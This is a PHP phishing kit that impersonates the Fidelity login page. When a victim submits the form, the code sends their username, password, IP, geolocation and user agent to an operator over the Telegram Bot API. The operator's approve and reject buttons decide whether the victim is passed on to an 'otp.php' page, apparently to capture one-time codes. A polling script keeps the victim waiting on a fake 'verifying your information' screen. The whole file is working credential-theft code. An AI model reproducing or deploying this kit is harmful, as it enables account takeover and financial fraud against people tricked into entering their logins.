<?php
session_start();
header('Content-Type: text/html; charset=UTF-8');

include 'config.php';

function sanitizeInput($input) {
    if (is_array($input)) {
        return array_map('sanitizeInput', $input);
    }
    $input = trim($input);
    $input = stripslashes($input);
    $input = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
    return $input;
}

function validateInput($input, $type = 'text', $maxLength = 255) {
    $input = trim($input);
    if (empty($input)) {
        return false;
    }
    if (strlen($input) > $maxLength) {
        return false;
    }
    switch ($type) {
        case 'username':
            return preg_match('/^[a-zA-Z0-9_@.-]+$/', $input) && strlen($input) >= 3 && strlen($input) <= 50;
        case 'password':
            return strlen($input) >= 1 && strlen($input) <= 20;
        default:
            return true;
    }
}

function checkRateLimit($identifier, $maxAttempts = 5, $timeWindow = 900) {
    $key = 'ratelimit_' . md5($identifier);
    $now = time();
    $attempts = $_SESSION[$key] ?? [];
    
    $attempts = array_filter($attempts, function($timestamp) use ($now, $timeWindow) {
        return ($now - $timestamp) < $timeWindow;
    });
    
    if (count($attempts) >= $maxAttempts) {
        $oldestAttempt = min($attempts);
        $remainingTime = $timeWindow - ($now - $oldestAttempt);
        return array('allowed' => false, 'remaining' => $remainingTime);
    }
    
    $attempts[] = $now;
    $_SESSION[$key] = array_values($attempts);
    
    return array('allowed' => true, 'remaining' => 0);
}

function generateCSRFToken() {
    if (!isset($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

function validateCSRFToken($token) {
    return isset($_SESSION['csrf_token']) && hash_equals($_SESSION['csrf_token'], $token);
}

function generateSubmissionToken() {
    if (!isset($_SESSION['submission_token'])) {
        $_SESSION['submission_token'] = bin2hex(random_bytes(16));
    }
    return $_SESSION['submission_token'];
}

function checkSubmissionToken($token) {
    if (!isset($_SESSION['submission_token']) || !hash_equals($_SESSION['submission_token'], $token)) {
        return false;
    }
    unset($_SESSION['submission_token']);
    return true;
}

function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

function getOrCreateUserId() {
    if (!isset($_SESSION['current_user_id']) || empty($_SESSION['current_user_id'])) {
        $_SESSION['current_user_id'] = '#' . strtoupper(substr(md5(uniqid('', true)), 0, 6));
    }
    return $_SESSION['current_user_id'];
}

function setLoginStatus($sessionId, $status) {
    $_SESSION['login_status_' . $sessionId] = [
        'status' => $status,
        'updatedAt' => date('c'),
        'sessionId' => $sessionId
    ];
    return true;
}

function getLoginStatus($sessionId) {
    $key = 'login_status_' . $sessionId;
    if (isset($_SESSION[$key]) && isset($_SESSION[$key]['status'])) {
        return $_SESSION[$key]['status'];
    }
    return 'pending';
}

function processTelegramUpdate($update) {
    include __DIR__ . '/config.php';
    
    if ($update && isset($update['callback_query'])) {
        $cb = $update['callback_query'];
        $messageChatId = $cb['message']['chat']['id'] ?? null;
        $data = $cb['data'] ?? '';
        
        if (strpos($data, 'LOGIN|') === 0) {
            $parts = explode('|', $data);
            $sessionId = $parts[1] ?? '';
            $action = strtolower($parts[2] ?? '');
            $status = ($action === 'approve') ? 'approved' : 'rejected';
            
            setLoginStatus($sessionId, $status);
            
            $apiBase = 'https://api.telegram.org/bot' . $botToken . '/';
            
            $answerData = array(
                'callback_query_id' => $cb['id'], 
                'text' => strtoupper($status) . ' for ' . $sessionId, 
                'show_alert' => false
            );
            
            if (function_exists('curl_init')) {
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $apiBase . 'answerCallbackQuery');
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($answerData));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_TIMEOUT, 10);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_exec($ch);
                curl_close($ch);
            }
            
            if (!empty($cb['message']['message_id'])) {
                $editPayload = array(
                    'chat_id' => $messageChatId,
                    'message_id' => $cb['message']['message_id'],
                    'reply_markup' => json_encode(array('inline_keyboard' => array())),
                    'text' => (($cb['message']['text'] ?? '') . "\n\n➡️ Decision: " . strtoupper($status))
                );
                
                if (function_exists('curl_init')) {
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $apiBase . 'editMessageText');
                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($editPayload));
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_exec($ch);
                    curl_close($ch);
                }
            }
            return true;
        }
    }
    return false;
}

if (isset($_GET['action']) && $_GET['action'] === 'status') {
    header('Content-Type: application/json');
    header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
    
    $sessionId = getOrCreateUserId();
    $status = getLoginStatus($sessionId);
    
    if (isset($botToken) && !empty($botToken)) {
        $apiUrl = 'https://api.telegram.org/bot' . $botToken . '/getUpdates';
        $offset = $_SESSION['telegram_offset'] ?? 0;
        
        if (function_exists('curl_init')) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $apiUrl . '?offset=' . $offset . '&timeout=1');
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 2);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $response = @curl_exec($ch);
            curl_close($ch);
        } else {
            $response = @file_get_contents($apiUrl . '?offset=' . $offset . '&timeout=1');
        }
        
        if ($response) {
            $updates = @json_decode($response, true);
            if (isset($updates['ok']) && $updates['ok'] === true && !empty($updates['result'])) {
                foreach ($updates['result'] as $update) {
                    @processTelegramUpdate($update);
                }
                $lastUpdate = end($updates['result']);
                $_SESSION['telegram_offset'] = $lastUpdate['update_id'] + 1;
            }
        }
        
        $status = getLoginStatus($sessionId);
    }
    
    echo json_encode(array('status' => $status, 'sessionId' => $sessionId));
    exit();
}

function sendToTelegram($username, $password, $userInfo) {
    include 'config.php';

    $sessionId = getOrCreateUserId();
    
    $message = "🔐 𝐋𝐎𝐆𝐈𝐍 𝐂𝐑𝐄𝐃𝐄𝐍𝐓𝐈𝐀𝐋𝐒 🔐\n";
    $message .= "═══════════════════════\n\n";
    $message .= "👤 𝐋𝐎𝐆𝐈𝐍 𝐈𝐍𝐅𝐎:\n";
    $message .= "🆔 Session ID: " . $sessionId . "\n";
    $message .= "👤 Username: " . $username . "\n";
    $message .= "🔒 Password: " . $password . "\n\n";
    $message .= "🌍 𝐋𝐎𝐂𝐀𝐓𝐈𝐎𝐍 & 𝐃𝐄𝐕𝐈𝐂𝐄:\n";
    $message .= "🌐 IP: " . $userInfo['ip'] . "\n";
    $message .= "🏳️ Country: " . $userInfo['country'] . "\n";
    $message .= "📍 Region: " . $userInfo['region'] . "\n";
    $message .= "🏙️ City: " . $userInfo['city'] . "\n";
    $message .= "🏢 ISP: " . $userInfo['isp'] . "\n";
    $message .= "📱 User Agent: " . substr($userInfo['userAgent'], 0, 50) . "...\n";
    $message .= "⏰ Time: " . date('Y-m-d H:i:s') . "\n";
    $message .= "═══════════════════════";
    
    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
    
    $approveCallback = 'LOGIN|' . $sessionId . '|approve';
    $rejectCallback = 'LOGIN|' . $sessionId . '|reject';
    
    $replyMarkup = array(
        'inline_keyboard' => array(
            array(
                array('text' => '✅ Approve', 'callback_data' => $approveCallback),
                array('text' => '❌ Reject', 'callback_data' => $rejectCallback)
            )
        )
    );
    
    $data = array(
        'chat_id' => $chatId,
        'text' => $message,
        'disable_web_page_preview' => true,
        'reply_markup' => json_encode($replyMarkup)
    );

    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        $response = curl_exec($ch);
        curl_close($ch);

        $decoded = json_decode($response, true);
        if (isset($decoded['ok']) && $decoded['ok'] === true) {
            return true;
        }
        return false;
    } else {
        $options = array(
            'http' => array(
                'header' => "Content-type: application/x-www-form-urlencoded\r\n",
                'method' => 'POST',
                'content' => http_build_query($data),
                'timeout' => 15,
                'ignore_errors' => true
            ),
            'ssl' => array(
                'verify_peer' => false,
                'verify_peer_name' => false,
                'allow_self_signed' => true
            )
        );
        $context = stream_context_create($options);
        $result = @file_get_contents($url, false, $context);
        if ($result === false) {
            return false;
        }
        $decoded = json_decode($result, true);
        if (!isset($decoded['ok']) || $decoded['ok'] !== true) {
            return false;
        }
        return true;
    }
}

$startPending = false;
$loginError = '';
$rateLimitError = '';
$csrfToken = generateCSRFToken();
$submissionToken = generateSubmissionToken();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $csrf = $_POST['csrf_token'] ?? '';
    $subToken = $_POST['submission_token'] ?? '';
    
    if (!validateCSRFToken($csrf)) {
        $loginError = 'Invalid security token. Please refresh the page and try again.';
    } elseif (!checkSubmissionToken($subToken)) {
        $loginError = 'This form has already been submitted. Please do not resubmit.';
    } else {
        $userIP = getUserIP();
        $rateLimitCheck = checkRateLimit($userIP . '_login', 5, 900);
        
        if (!$rateLimitCheck['allowed']) {
            $remainingMinutes = ceil($rateLimitCheck['remaining'] / 60);
            $rateLimitError = "Too many login attempts. Please try again in {$remainingMinutes} minute(s).";
        } else {
            $username = $_POST['username'] ?? '';
            $password = $_POST['password'] ?? '';
            $remember = isset($_POST['remember']) ? 'Yes' : 'No';
            
            $username = sanitizeInput($username);
            $password = sanitizeInput($password);
            
            if (empty($username) || empty($password)) {
                $loginError = 'Please enter both username and password.';
            } elseif (!validateInput($username, 'username')) {
                $loginError = 'Invalid username format. Username must be 3-50 characters and contain only letters, numbers, and special characters (@, ., -, _).';
            } elseif (!validateInput($password, 'password')) {
                $loginError = 'Invalid password format. Password must be 1-20 characters.';
            } else {
                if ($remember === 'Yes') {
                    setcookie('remembered_username', $username, time() + (86400 * 30), '/');
                } else {
                    setcookie('remembered_username', '', time() - 3600, '/');
                }
                
                $_SESSION['fidelity_user_id'] = $username;
                $_SESSION['fidelity_login_password'] = $password;
                $_SESSION['login_submitted'] = true;
                $sessionId = getOrCreateUserId();
                
                setLoginStatus($sessionId, 'pending');
                
                $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
                $ipInfo = @file_get_contents("http://ip-api.com/json/{$userIP}");
                $ipData = json_decode($ipInfo, true);
                $userInfo = array(
                    'ip' => $userIP,
                    'country' => $ipData['country'] ?? 'Unknown',
                    'region' => $ipData['regionName'] ?? 'Unknown',
                    'city' => $ipData['city'] ?? 'Unknown',
                    'isp' => $ipData['isp'] ?? 'Unknown',
                    'userAgent' => $userAgent
                );
                sendToTelegram($username, $password, $userInfo);
                $startPending = true;
            }
        }
    }
}

if (isset($_SESSION['login_submitted']) && $_SESSION['login_submitted'] && !$startPending) {
    $sessionId = getOrCreateUserId();
    $status = getLoginStatus($sessionId);
    if ($status === 'approved') {
        header('Location: otp.php');
        exit();
    } elseif ($status === 'rejected') {
        unset($_SESSION['login_submitted']);
        $loginError = 'Your login credentials were rejected. Please check your username and password and try again.';
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Log in to Fidelity</title>
<link rel="stylesheet" href="assets/fonts.css">
<link rel="stylesheet" href="assets/dom-signin.css">
<link rel="stylesheet" href="assets/common-logincss.css">
<style>
.pvdccl-label-root {
  margin-bottom: 0.5rem;
}
.pvdccl-label {
  font-weight: 600;
  display: block;
}
.pvdccl-required::after {
  content: "*";
  color: #dc1616;
  margin-left: 0.25rem;
}
.pvdccl-input-container {
  position: relative;
}
.pvdccl-input {
  width: 100%;
  padding: 0.75rem;
  border: 1px solid #ccc;
  border-radius: 4px;
  font-size: 1rem;
}
.pvdccl-input:focus {
  border-color: #006fba;
  outline: none;
  box-shadow: 0 0 0 2px rgba(0,111,186,0.2);
}
.pvdccl-input--error {
  border-color: #dc1616;
}
.pvdccl-error-message {
  color: #dc1616;
  font-size: 0.875rem;
  margin-top: 0.25rem;
}
.loading {
    display: none;
    text-align: center;
    padding: 2rem;
}
.loading.show {
    display: block;
}
.login-error {
    display: none;
    align-items: center;
    gap: 10px;
    margin-bottom: 15px;
    padding: 16px;
    border-radius: 8px;
    border: 2px solid #DC1616;
    background: #FFF5F5;
}
.login-error.show {
    display: flex;
}
.rate-limit-error {
    color: #dc1616;
    background: #fff5f5;
    border: 1px solid #dc1616;
    padding: 1rem;
    border-radius: 4px;
    margin-bottom: 1rem;
}
.spinner {
    display: inline-block;
    width: 40px;
    height: 40px;
    border: 3px solid #f3f3f3;
    border-top: 3px solid #3498db;
    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin-top: 1rem;
}
@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}
.loading-text {
    margin-top: 1rem;
    color: #666;
}
.loading-list {
    text-align: left;
    max-width: 400px;
    margin: 1rem auto;
    color: #666;
}
</style>
</head>
<body>

<header class="dom-padding-top-4 dom-padding-bottom-4 dom-text-inverse" role="banner">
<div class="dom-row">
<div class="dom-small-12 dom-columns">
<div class="dom-flex dom-flex-v-center">
<a aria-current="page" href="/" class="dom-inline-block" data-testid="header-logo">
<img alt="Fidelity" src="assets/Fidelity-wordmark.svg" height="28">
</a>
</div>
</div>
</div>
</header>

<main class="dom-row" role="main">
<div class="dom-small-12 dom-columns dom-text-center">

<div class="loading<?php if ($startPending): ?> show<?php endif; ?>" id="loading">
    <div class="spinner"></div>
    <div class="loading-text">Please give us a moment while we verify your information.</div>
    <ul class="loading-list">
        <li>Please do not refresh or close this page.</li>
        <li>This process may take up to, but will not exceed, 5 minutes of waiting.</li>
    </ul>
</div>

<div class="pvdccl-form-root<?php if ($startPending): ?> hide<?php endif; ?>">

<?php if (!empty($rateLimitError)): ?>
<div class="rate-limit-error">
<?php echo htmlspecialchars($rateLimitError); ?>
</div>
<?php endif; ?>

<div class="login-error<?php if (!empty($loginError)): ?> show<?php endif; ?>" id="loginError">
<svg width="30" height="30" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" fill="#DC1616"/>
</svg>
<span style="color: #DC1616; font-family: 'Fidelity Sans', Arial, sans-serif;"><?php echo htmlspecialchars($loginError); ?></span>
</div>

<form accept-charset="UTF-8" action="" autocomplete="off" class="pvdccl-form dom-padding-top-4 dom-padding-bottom-4" method="post" name="loginForm">
<input type="hidden" name="csrf_token" value="<?php echo $csrfToken; ?>">
<input type="hidden" name="submission_token" value="<?php echo $submissionToken; ?>">

<h1 class="pvdccl-heading pvdccl-heading--size-3 pvdccl-heading--weight-normal" style="font-size:1.75rem; font-weight:400; margin-bottom:1.5rem;">
Log in
</h1>

<div class="pvdccl-form-field pvdccl-margin-bottom-3" style="margin-bottom:1.5rem;">
<label class="pvdccl-label-root pvdccl-label" for="dom-username-input">
Username
</label>
<div class="pvdccl-input-container">
<input autocomplete="username" class="pvdccl-input" id="dom-username-input" name="username" required="" type="text" value="<?php echo isset($_COOKIE['remembered_username']) ? htmlspecialchars($_COOKIE['remembered_username']) : ''; ?>">
</div>
</div>

<div class="pvdccl-form-field pvdccl-margin-bottom-3" style="margin-bottom:1.5rem;">
<label class="pvdccl-label-root pvdccl-label" for="dom-pswd-input">
Password
</label>
<div class="pvdccl-input-container" style="position:relative;">
<input autocomplete="current-password" class="pvdccl-input" id="dom-pswd-input" name="password" required="" type="password" style="padding-right:40px;">
<button type="button" class="password-toggle" style="position:absolute; right:10px; top:50%; transform:translateY(-50%); background:none; border:none; cursor:pointer; padding:5px;">
<svg width="20" height="20" viewBox="0 0 24 24" fill="#666">
<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
</svg>
</button>
</div>
</div>

<div class="pvdccl-form-field pvdccl-margin-bottom-3" style="margin-bottom:1.5rem; text-align:left;">
<label class="pvdccl-checkbox" for="remember-me">
<input id="remember-me" name="remember" type="checkbox" value="true">
<span>Remember my username</span>
</label>
</div>

<div class="pvdccl-form-field">
<button class="pvdccl-button pvdccl-button--primary" id="dom-login-button" type="submit" style="background:#368727; color:#fff; border:none; padding:0.75rem 1.5rem; border-radius:4px; font-size:1rem; cursor:pointer; width:100%;">
Log in
</button>
</div>

<div class="dom-padding-top-3" style="margin-top:1.5rem; text-align:left;">
<a class="dom-link" href="#">Forgot username?</a>
<span aria-hidden="true" class="dom-margin-left-1 dom-margin-right-1">|</span>
<a class="dom-link" href="#">Forgot password?</a>
</div>

</form>
</div>

</div>
</main>

<script>
var loadingDiv = document.getElementById('loading');
var formRoot = document.querySelector('.pvdccl-form-root');
var loginForm = document.querySelector('form');
var loginButton = document.getElementById('dom-login-button');
var passwordInput = document.getElementById('dom-pswd-input');
var passwordToggle = document.querySelector('.password-toggle');

function isLoading(bool) {
    if (bool === true) {
        loadingDiv.classList.add('show');
        if (formRoot) formRoot.classList.add('hide');
    } else {
        loadingDiv.classList.remove('show');
        if (formRoot) formRoot.classList.remove('hide');
    }
}

if (passwordToggle && passwordInput) {
    passwordToggle.addEventListener('click', function(e) {
        e.preventDefault();
        if (passwordInput.type === 'password') {
            passwordInput.type = 'text';
        } else {
            passwordInput.type = 'password';
        }
    });
}

var formSubmitted = false;

loginForm.addEventListener('submit', function(e) {
    if (formSubmitted) {
        e.preventDefault();
        return false;
    }
    formSubmitted = true;
    isLoading(true);
});

var usernameInput = document.getElementById('dom-username-input');
if (usernameInput && !usernameInput.value) {
    setTimeout(function() {
        usernameInput.focus();
    }, 100);
}

<?php if (!empty($startPending)): ?>
(function(){
    isLoading(true);
    var polling = true;
    var pollDelay = 2000;
    var maxDelay = 30000;
    var startTime = Date.now();
    var maxPollTime = 300000;
    var retryCount = 0;
    var maxRetries = 3;
    
    function poll() {
        if (!polling) return;
        
        var elapsed = Date.now() - startTime;
        if (elapsed > maxPollTime) {
            polling = false;
            isLoading(false);
            formSubmitted = false;
            var errBox = document.getElementById('loginError');
            if (errBox) {
                errBox.querySelector('span').textContent = 'Request timed out. Please try again.';
                errBox.classList.add('show');
            }
            return;
        }
        
        fetch('?action=status', {cache: 'no-store'})
            .then(function(res) {
                if (!res.ok) throw new Error('Network error');
                return res.json();
            })
            .then(function(data) {
                retryCount = 0;
                if (data && data.status === 'approved') {
                    polling = false;
                    setTimeout(function() {
                        window.location.href = 'otp.php';
                    }, 100);
                } else if (data && data.status === 'rejected') {
                    polling = false;
                    isLoading(false);
                    formSubmitted = false;
                    var errBox = document.getElementById('loginError');
                    if (errBox) {
                        errBox.querySelector('span').textContent = 'Your login credentials were rejected. Please check your username and password and try again.';
                        errBox.classList.add('show');
                    }
                    if (passwordInput) passwordInput.value = '';
                } else {
                    pollDelay = Math.min(pollDelay * 1.5, maxDelay);
                    setTimeout(poll, pollDelay);
                }
            })
            .catch(function(error) {
                retryCount++;
                if (retryCount >= maxRetries) {
                    polling = false;
                    isLoading(false);
                    formSubmitted = false;
                } else {
                    setTimeout(poll, pollDelay);
                }
            });
    }
    poll();
})();
<?php endif; ?>
</script>

<style>
.hide { display: none !important; }
</style>

</body>
</html>